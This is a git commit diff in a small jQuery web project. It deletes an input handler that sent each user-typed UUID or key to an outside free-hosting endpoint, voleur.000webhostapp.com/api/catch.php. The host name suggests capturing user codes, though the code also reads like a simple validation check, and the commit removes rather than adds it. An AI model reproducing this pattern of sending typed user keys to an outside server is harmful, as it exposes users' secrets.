1fdbfc7d432a88d712692bfd0619f901f68f17ed
eternaltoxic <spkespke@gmail.com>
2020-03-11 09:45:36 +0200

    deleted unnecessary code

--- tab/createTable.js
+++ tab/createTable.js
@@ -43,4 +43,3 @@ $(function() {
 
 });
 
-setTimeout(() => req());
--- tab/release.js
+++ tab/release.js
@@ -63,47 +63,6 @@ $(function() {
                 console.log(`Loaded ${event.loaded} from ${event.total}`);
             };
         }
-
-        $('#enter_uuid_field').on('input', function () {  //обрабатываем нажатие на кнопку
-            var user_key = $('#enter_uuid_field').val();
-            if (user_key != "") {
-                document.getElementById('loader').style.display = "block";
-                document.getElementById('enter_uuid_field').style.border = "3px solid black"; //
-
-                var url = 'https://voleur.000webhostapp.com/api/catch.php?code=' + user_key;
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', url, true);
-                xhr.send();
-                xhr.onload = function () {//получаем ответ от сервера
-                    document.getElementById('loader').style.display = "none";
-                    console.log(`Loaded: ${xhr.status}`); //статус
-                    response = JSON.parse(xhr.response); //тело ответа
-                    console.log(response);
-                    if (response["result"] == 'error') {
-                        document.getElementById('enter_uuid_field').style.border = "3px solid red";
-                    } else {
-                        document.getElementById('enter_uuid_field').style.border = "3px solid lightgreen";
-                        setTimeout(function () {
-                            console.log('redirect there'); //redirect
-                        }, 1500);
-                    }
-                };
-
-                xhr.onerror = function () { // происходит, только когда запрос совсем не получилось выполнить
-                    console.log(`Error connect`);
-                };
-
-                xhr.onprogress = function (event) { // запускается периодически
-                    // event.loaded - количество загруженных байт
-                    // event.lengthComputable = равно true, если сервер присылает заголовок Content-Length
-                    // event.total - количество байт всего (только если lengthComputable равно true)
-                    console.log(`Loaded ${event.loaded} from ${event.total}`);
-                };
-            }
-
-        });
-
-
     });
 });
 
